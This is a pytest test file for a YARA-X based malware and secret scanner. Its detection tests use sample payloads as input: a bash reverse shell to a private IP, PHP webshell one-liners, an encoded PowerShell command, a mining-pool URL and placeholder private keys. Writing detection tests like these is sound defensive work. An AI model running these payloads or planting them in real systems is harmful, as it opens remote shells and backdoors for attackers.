"""
tests/test_yarax_scan.py
Unit tests for samplescript/yarax_scan.py

Run with:
    pip install yara-x pytest
    pytest tests/test_yarax_scan.py -v
"""

import importlib
import os
import sys
import subprocess
import textwrap
import tempfile
import pytest

# Path helpers
REPO_ROOT   = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SCRIPT_PATH = os.path.join(REPO_ROOT, "samplescript", "yarax_scan.py")
RULES_DIR   = os.path.join(REPO_ROOT, "rules")


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def run_scanner(data: bytes, extra_args=None) -> subprocess.CompletedProcess:
    """Run yarax_scan.py with data piped to stdin."""
    cmd = [sys.executable, SCRIPT_PATH, RULES_DIR] + (extra_args or [])
    return subprocess.run(
        cmd,
        input=data,
        capture_output=True,
    )


def run_scanner_file(data: bytes, extra_args=None) -> subprocess.CompletedProcess:
    """Run yarax_scan.py with data written to a temp file."""
    with tempfile.NamedTemporaryFile(delete=False) as tmp:
        tmp.write(data)
        tmp_path = tmp.name
    try:
        cmd = [sys.executable, SCRIPT_PATH, RULES_DIR, "--file", tmp_path] + (extra_args or [])
        return subprocess.run(cmd, capture_output=True)
    finally:
        os.unlink(tmp_path)


# ---------------------------------------------------------------------------
# Tests – clean data
# ---------------------------------------------------------------------------

class TestCleanData:

    def test_clean_text_exits_zero(self):
        result = run_scanner(b"This is a perfectly normal CSV file.\nname,age\nAlice,30\n")
        assert result.returncode == 0

    def test_clean_text_prints_clean(self):
        result = run_scanner(b"Hello world, nothing suspicious here.")
        assert b"CLEAN" in result.stdout

    def test_empty_stdin_exits_zero(self):
        result = run_scanner(b"")
        assert result.returncode == 0

    def test_clean_json_output(self):
        result = run_scanner(b"safe content", extra_args=["--json"])
        assert result.returncode == 0
        import json
        data = json.loads(result.stdout)
        assert data["status"] == "clean"
        assert data["match_count"] == 0

    def test_file_mode_clean(self):
        result = run_scanner_file(b"clean file content, nothing malicious")
        assert result.returncode == 0


# ---------------------------------------------------------------------------
# Tests – threat detection
# ---------------------------------------------------------------------------

class TestThreatDetection:

    def test_bash_reverse_shell_detected(self):
        payload = b"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
        result = run_scanner(payload)
        assert result.returncode == 1

    def test_php_webshell_detected(self):
        payload = b"<?php eval(base64_decode('dGVzdA==')); ?>"
        result = run_scanner(payload)
        assert result.returncode == 1

    def test_powershell_encoded_command_detected(self):
        payload = b"powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"
        result = run_scanner(payload)
        assert result.returncode == 1

    def test_private_key_detected(self):
        payload = b"-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA..."
        result = run_scanner(payload)
        assert result.returncode == 1

    def test_aws_access_key_detected(self):
        payload = b"aws_access_key_id = AKIAIOSFODNN7EXAMPLE"
        result = run_scanner(payload)
        assert result.returncode == 1

    def test_threat_json_output(self):
        payload = b"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
        result = run_scanner(payload, extra_args=["--json"])
        assert result.returncode == 1
        import json
        data = json.loads(result.stdout)
        assert data["status"] == "threat_detected"
        assert data["match_count"] >= 1
        assert len(data["matches"]) >= 1

    def test_threat_output_contains_rule_name(self):
        payload = b"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
        result = run_scanner(payload)
        assert result.returncode == 1
        assert b"Malware_Reverse_Shell_Bash" in result.stdout

    def test_file_mode_threat(self):
        payload = b"<?php system($_GET['cmd']); ?>"
        result = run_scanner_file(payload)
        assert result.returncode == 1

    def test_crypto_miner_detected(self):
        payload = b"stratum+tcp://pool.minexmr.com:4444"
        result = run_scanner(payload)
        assert result.returncode == 1

    def test_pem_private_key_in_file(self):
        payload = b"-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAA=\n-----END OPENSSH PRIVATE KEY-----"
        result = run_scanner_file(payload)
        assert result.returncode == 1


# ---------------------------------------------------------------------------
# Tests – error handling
# ---------------------------------------------------------------------------

class TestErrorHandling:

    def test_missing_rules_dir_exits_two(self):
        cmd = [sys.executable, SCRIPT_PATH, "/nonexistent/rules/dir"]
        result = subprocess.run(cmd, input=b"data", capture_output=True)
        assert result.returncode == 2

    def test_missing_file_arg_exits_two(self):
        cmd = [sys.executable, SCRIPT_PATH, RULES_DIR, "--file", "/nonexistent/file.bin"]
        result = subprocess.run(cmd, capture_output=True)
        assert result.returncode == 2
